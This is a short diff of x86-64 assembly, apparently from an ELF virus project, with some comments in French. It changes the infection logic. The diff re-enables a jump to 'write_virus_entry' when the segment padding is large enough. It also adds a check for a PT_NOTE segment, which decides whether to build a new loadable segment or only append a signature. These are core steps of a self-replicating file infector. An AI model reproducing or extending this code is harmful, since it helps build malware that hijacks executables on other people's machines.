@@ -110,6 +110,7 @@ get_first_pload:
     add rdi, [rsi + e_phoff]      ; rdi = pheader address
 
     mov [r12 + pload], rax
+    mov [r12 + ptnote], rax       ; set pload and ptnote value to 0
     mov cx, [rsi + e_phnum]
     mov dx, [rsi + e_phentsize]
 
@@ -147,7 +148,10 @@ check_pload_size:
     div rdi
     sub rdi, rdx
     cmp rdi, PROG_SIZE                      ; regarde si on a assez de place dans le bourrage et fait un simple append de la signature si on a pas assez
-;    jge write_virus_entry
+    jge write_virus_entry
+    cmp qword [r12 + ptnote], 0             ; check if a ptnote has been found and just add a signature if there is none
+    jz simple
+
 create_new_pload:
     mov rax, [r12 + lastPload]
     mov rbx, [rax + p_vaddr]
